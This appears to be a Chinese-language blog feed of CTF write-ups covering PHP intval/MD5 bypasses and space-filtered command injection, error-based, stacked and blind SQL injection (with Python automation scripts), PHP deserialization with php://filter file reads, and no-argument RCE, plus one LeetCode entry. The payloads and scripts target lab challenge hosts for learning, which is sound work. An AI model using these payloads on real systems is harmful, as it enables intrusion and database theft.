class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现有三个等级，第一关是intval：</p>
<p>去查了一下这个函数：</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/5.png" alt="4"></p>
<p>可以看到，当我们输入的是一个字符串的科学计数法时，因为php是弱指令，她会自动判定成首位的数字，而当他变成数字时又会完整输出，我们知道php是一个弱指令语言，所以当他在遇到运算符之后会更改类型，也就是说’1e10’在加1之后会变成int类型</p>
<p>回到题目</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以构造科学计数法绕过，2e4是20000但是在前面会被判定成2，加1之后改变类型绕过成功绕过if</p>
<p>（这个方法只有在php5版本可以使用）</p>
<p>第二层是MD5比较</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line"><span class="meta">   $</span><span class="bash">md5=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span></span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们需要构造一个MD5上传，使他在MD5前后都相等，也就是说，我们需要找到0e开头的MD5数因为我们知道0e开头的数会被判定成0</p>
<p>找了很多资料也没找到0e开头的，最后找到了一个0e215962017，成功绕过</p>
<p>进入第三层，终于可以拿到flag了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要传入一个get_flag参数，函数中不能有空格，否则会直接退出</p>
<p>第二个if判断，我们输入的参数中不能含有cat，如果含有cat则将其替换成wctf2020</p>
<p>我们用${IFS}来绕过空格，最后构造</p>
<p><code>tail$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<p>就可以拿到flag</p>
<p>最终payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=tail$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>WUSTCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战HardSQL</title>
    <url>/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战Hardsql"><a href="#极客大挑战Hardsql" class="headerlink" title="极客大挑战Hardsql"></a>极客大挑战Hardsql</h1><p>// 题目是一个很容易的报错题目</p>
<p>首先判断出错点：</p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/1.png" alt="1"></p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/2.png" alt="2"></p>
<p>尝试得出是字符串注入单引号闭合</p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/3.png" alt="3"></p>
<p>经过尝试判断出此题过滤空格等于号等字符</p>
<p>我们可以用括号进行绕过</p>
<p>因为无法回显所以想到报错注入</p>
<p>此题可以用的是xpath注入</p>
<p>也就是updatexml以及extractvalue()注入</p>
<p>用updatexml为例：</p>
<p>构造payload</p>
<p>因为用or不好连接而此题没有屏蔽符号所以用^来代替or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password=admin&#x27;^updatexml(1,concat(0x7e,database()),1)%23				// 0x7e是~ %23是url编码的#</span><br></pre></td></tr></table></figure>



<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/4.png" alt="4"></p>
<p>得知库为geek</p>
<p>接下来就爆表爆字段</p>
<p>表payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))),1)%23</span><br><span class="line">因为此题过滤了=所以用like进行绕过作用相同</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/5.png" alt="5"></p>
<p>字段payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;^updatexml(1,concat(0x7e,(select(column_name)from(information_schema.columns)where(table_name)like(&#x27;geek&#x27;))),1)%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/6.png" alt="6"></p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^updatexml(1,concat(0x7e,(select(password)from(H4rDsq1))),1)%23</span><br></pre></td></tr></table></figure>

<p>注意：xpath函数报错只会回显32个字符</p>
<p>最后进行拼接得出flag</p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/7.png" alt="7">flag{fd706149-94a1-449c-b1ee-68f4af78dd5d}</p>
]]></content>
      <tags>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>王鼎杯2020青龙组AreUSerialz</title>
    <url>/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/</url>
    <content><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>同样先进去看看发现是一道序列化题目</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/1.png" alt="1"></p>
<p>然后进行代码审计</p>
<p>注意：这类型题目在进行反序列化时首先调用的是__destruct()魔术方法</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/2.png" alt="2"></p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/5.png" alt="5"></p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/4.png" alt="4"></p>
<p>我们可以看到这里上面的2是强比较类型（同类型同大小同数值）而下面是弱比较类型不一定需要类型相同所以要绕过这个if我们可以直接用int类型2</p>
<p>可以看到我们可以进行文件读取filename就是我们需要读取的文件路径</p>
<p>我们可以通过php伪协议进行读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>所以我们需要改的参数只有op以及filename</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">``protected` `$op``=2;</span><br><span class="line">``protected` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">``protected` `$content``;</span><br></pre></td></tr></table></figure>

<p>我们直接进行序列化</p>
<p>注意class类型序列化时需要先实例化对象</p>
<p>最后都得到</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/8.png" alt="8"></p>
<p>发现有三个显示不正确的地方</p>
<p>上网查了一下发现是%00的编码无法通过上面的is_valid函数校验（参考文档：<a class="link" href="https://www.cnblogs.com/Cl0ud/p/12874458.html%EF%BC%89">https://www.cnblogs.com/Cl0ud/p/12874458.html）<i class="fas fa-external-link-alt"></i></a></p>
<p>最简单的解决办法是将上面类中的对象转换成public类型（因为php7+版本对属性不敏感）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">public` `$op``=2;</span><br><span class="line">public` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">public` `$content``;</span><br></pre></td></tr></table></figure>

<p>最后得到</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/7.png" alt="7"></p>
<p>最后用get方式传进str</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/9.png" alt="9"></p>
<p>最后进行base64解码就行了</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/11.png" alt="11"></p>
<p>flag{242b88d2-1121-4c83-a6e4-7685dc25adfb}</p>
]]></content>
      <tags>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title>禁止套娃</title>
    <url>/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>进入题目就一句话，啥也没有</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/2.png" alt="1"></p>
<p>猜测一下是不是藏起来了？</p>
<p>找了半天没找到，扫描一下目录也没有，最后找到是git源码泄露</p>
<p>用githack来下载源码</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/1.png" alt="1"></p>
<p>可以看到需要有四个if需要绕过</p>
<p>第一个是确定以get方式传入exp</p>
<p>第二个是禁止了协议，php伪协议都不行了</p>
<p>第三个<strong>if</strong>(<strong>‘;’ === preg_replace</strong>(<strong>‘/[a-z,_]+((?R)?)/‘, <strong>NULL</strong>, <strong>&lt;**span **class**=”katex math inline”**&gt;</strong>_GET</strong>[<strong>‘exp’</strong>]))中(?R)指的是引用当前表达式后面加了一个？是递归调用（<strong>完全不懂，查了之后才知道</strong>）整个的意思是将匹配到的字符替换为空，也就是说我们只能用无参函数可以嵌套无参函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a(b(c()))可以使用</span><br><span class="line">a(&#x27;b&#x27;)这种里面有参数的不行</span><br></pre></td></tr></table></figure>

<p>第四个又过滤et info等函数</p>
<p>很明显就是无参数RCE了，</p>
<p>我们现需要看看里面又啥文件，可以构造print_r(scandir(‘.’));</p>
<p>但是我们函数里面又不能有参数，</p>
<p>实在没办法，请教大佬，看了看大佬的wp</p>
<p>学到了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">他是一个数组，第一个就是.我们需要调用数组的第一个又需要介绍一个函数</span><br><span class="line">current（）</span><br><span class="line">他们俩组合current(locakeconv())</span><br><span class="line">就可以调用‘.’拉</span><br></pre></td></tr></table></figure>

<p>那我们把上面的.替换掉</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/3.png" alt="1"></p>
<p>可以看到我们需要读取的文件在倒数第三个</p>
<p>这里又学到一个姿势</p>
<p>把数组倒置反向排序，然后选取第二个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">需要用到的函数：</span><br><span class="line">array_reverse()</span><br><span class="line">next（）</span><br><span class="line">先倒置再取下一个</span><br><span class="line">next（array_reverse()）</span><br></pre></td></tr></table></figure>

<p>那么payload：</p>
<p>？exp=print_r(next(array_reverse(current(localeconv()))));</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/4.png" alt="1"></p>
<p>接下来就是读文件了，把print_r换成highlight_file</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(current(localeconv()))));</span><br></pre></td></tr></table></figure>



<p>就可以拿到flag了</p>
<p><img src="/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/5.png" alt="1"></p>
]]></content>
  </entry>
  <entry>
    <title>蛛蛛...嘿嘿♥我的蛛蛛</title>
    <url>/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/</url>
    <content><![CDATA[<h1 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h1><p>进去之后先看看</p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/1.png" alt="1"></p>
<p>点了一下，发现方框变多但是只有一个是真的</p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/2.png" alt="1"></p>
<p>查看源代码的时候可以看到哪个是真的</p>
<p>但是一直点也不知道什么时候结束，写一个简单的爬虫脚本方便我们直接得到那个页面</p>
<p>附上我的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开发时间：2022/2/6:16:50</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/714c5754f1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    urrl = url + key</span><br><span class="line">    uuu = re.<span class="built_in">compile</span>(<span class="string">&#x27;href=&quot;(.*?)&quot;&#x27;</span>)   <span class="comment">#匹配括号中的内容</span></span><br><span class="line">    r = requests.get(url=urrl)          <span class="comment">#用get方式传入参数</span></span><br><span class="line">    l = re.findall(uuu, r.text)    <span class="comment">#在r.text中匹配UUU规则中的数据</span></span><br><span class="line">    <span class="built_in">print</span>(urrl)                 <span class="comment">#查看访问网址</span></span><br><span class="line">    key = [i <span class="keyword">for</span> i <span class="keyword">in</span> l <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>]  <span class="comment">#从l中提取数据直到他为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = key[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>直接访问最后一个网页</p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/4.png" alt="1"></p>
<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/3.png" alt="1"></p>
<p>最后找flag就简单了慢慢找呗，最后发现flag是在请求头里面</p>
]]></content>
  </entry>
  <entry>
    <title>随便注</title>
    <url>/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>首先进入题目：</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" alt="1"></p>
<p>看起来是sql注入先试试看看有啥报错</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" alt="1"></p>
<p>看起来是单引号字符型漏洞</p>
<p>测试一下他的列数</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" alt="1"></p>
<p>4看起来不行</p>
<p>测试了一下2的时候可以正常回显</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" alt="1"></p>
<p>所以列数是2，用select看看有没有回显的地方</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" alt="1"></p>
<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
<p>但是没有过滤show所以考虑到堆叠注入</p>
<p>看一看库</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
<p>表：</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
<p>发现其中有两个表</p>
<p>看看里面有啥</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.png" alt="1"></p>
<p>发现单引号不行，测试一下双引号还有反撇号</p>
<p>发现反撇号`可以</p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" alt="1"></p>
<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/12.png" alt="1"></p>
<p>可以看到1919这个表这里面含有flag但是输出的时候输出的是words表中的数据</p>
<p>而这题又屏蔽了一些可以用的函数</p>
<p>想想其他办法</p>
<p>我们可以重命名表然后把表中的flag改成id这样查询就可以直接查询到id的数据而id的数据就是flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=1&#x27;;RENAME TABLE `words` TO `word1`;RENAME `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100)SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from `words`;#`</span><br></pre></td></tr></table></figure>

<p>就可以直接输出flag了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;39e1f712-9675-492f-9e7a-7cb9ece7ba2f</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>leetcode</title>
    <url>/2022/03/08/leetcode/</url>
    <content><![CDATA[<h1 id="力扣每日一刷"><a href="#力扣每日一刷" class="headerlink" title="力扣每日一刷"></a>力扣每日一刷</h1><h2 id="具有所有最深节点的最小子树"><a href="#具有所有最深节点的最小子树" class="headerlink" title="[具有所有最深节点的最小子树]"></a>[具有所有最深节点的最小子树]</h2><p>简单分析题目：</p>
<p>如果二叉树深度相等，返回root，如果二叉树不等，返回导致不等的点</p>
<p>也就是说我们需要先判断深度，可以写一个深度函数然后调用之后比较递归至深的部分，然后递归调用直到他平衡输出这个点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subtreeWithAllDeepest</span>(<span class="params">self, root: TreeNode</span>) -&gt; TreeNode:</span></span><br><span class="line">    left_deep = self.deep(root.left)</span><br><span class="line">    right_deep = self.deep(root.right)</span><br><span class="line">    <span class="keyword">if</span> (left_deep == right_deep):</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    <span class="keyword">elif</span>(left_deep &gt; right_deep):</span><br><span class="line">        <span class="keyword">return</span> self.subtreeWithAllDeepest(root.left) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> self.subtreeWithAllDeepest(root.right)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deep</span>(<span class="params">self, tree</span>):</span> <span class="comment">#计算树的深度</span></span><br><span class="line">    <span class="keyword">if</span> tree == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(self.deep(tree.left), self.deep(tree.right)) + <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="栈的最小值"><a href="#栈的最小值" class="headerlink" title="[栈的最小值]"></a>[栈的最小值]</h1><p>就是输入一组数据，写出栈的效果，然后找出最小值</p>
<p>可以写一个正常的栈还有一个最小栈</p>
<p>正常的数组就正常pop还有append，最小栈可以先赋值一个无穷大，然后跟小的数比较，如果小就加到后面去最后pop最小栈就是最小数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class MinStack:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        initialize your data structure here.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.Stack = []</span><br><span class="line">        self.Min = [math.inf]   #存放正无穷    </span><br><span class="line"></span><br><span class="line">    def push(self, x: int) -&gt; None:</span><br><span class="line">        self.Stack.append(x)</span><br><span class="line">        self.Min.append(min(x,self.Min[-1]))</span><br><span class="line"></span><br><span class="line">    def pop(self) -&gt; None:</span><br><span class="line">        self.Stack.pop()</span><br><span class="line">        self.Min.pop()</span><br><span class="line"></span><br><span class="line">    def top(self) -&gt; int:</span><br><span class="line">        return self.Stack[-1]</span><br><span class="line"></span><br><span class="line">    def getMin(self) -&gt; int:</span><br><span class="line">        return self.Min[-1]</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>FinallySQL</title>
    <url>/2022/03/09/FinallySQL/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-FinallySQL"><a href="#极客大挑战2019-FinallySQL" class="headerlink" title="[极客大挑战2019]FinallySQL"></a>[极客大挑战2019]FinallySQL</h1><p>本题考点：</p>
<p>sql盲注</p>
<p>进入题目</p>
<p><img src="/2022/03/09/FinallySQL/1.PNG" alt="1"></p>
<p>页面给出了提示，sql盲注</p>
<p>给出了一个登录框，然后还有一点提示，随便测试了一下在双引号的时候没有反应，单引号的时候发现被过滤，双引号后面结什么都是过滤，换个地方，尝试点点上面的提示</p>
<p>发现点击之后传入id参数在这个参数测试了一下发现在^的时候可以回显正确值，那么注入点就在这里了。</p>
<p>可以构造1^1^1–+把构造的语句放在中间，进行盲注（因为没有过滤别的什么内容，就不继续写了）附上代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url = &#x27;http://a01bf763-5eda-42df-959f-7286945de334.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(156,230):</span><br><span class="line">    sleep(1)</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        database = f&quot;1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        tables = f&quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        columns = f&quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        flag = f&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span><br><span class="line">        #io = requests.get(url +  database + &#x27;--+&#x27;)</span><br><span class="line">        io = requests.get(url + flag + &#x27;--+&#x27;)</span><br><span class="line">        if &quot;ERROR&quot; in io.text:</span><br><span class="line">            #print(i, j)</span><br><span class="line">            s += chr(j)</span><br><span class="line">            print(s)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>因为爆的太慢，还容易被ban这里就不多说了，flag在F1naI1y表的password中</p>
<p>优化算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://75d430f7-f380-47d0-bdde-a42ca16af21f.node4.buuoj.cn:81/search.php&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def payload(i, j):</span><br><span class="line">    # 数据库名字</span><br><span class="line">    #sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 表名</span><br><span class="line">    # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 列名</span><br><span class="line">    # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 查询flag</span><br><span class="line">    sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">    data = &#123;&quot;id&quot;: sql&#125;</span><br><span class="line">    r = requests.get(url, params=data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res = 1</span><br><span class="line">    else:</span><br><span class="line">        res = 0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1, 10000):</span><br><span class="line">        print(i, &#x27;:&#x27;)</span><br><span class="line">        low = 31</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt;= high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            res = payload(i, mid)</span><br><span class="line">            if res:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid - 1</span><br><span class="line">        f = int((low + high + 1)) // 2</span><br><span class="line">        if (f == 127 or f == 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag += chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">print(&#x27;flag=&#x27;, flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>ISITDTU-EasyPHP</title>
    <url>/2022/03/11/ISITDTU-EasyPHP/</url>
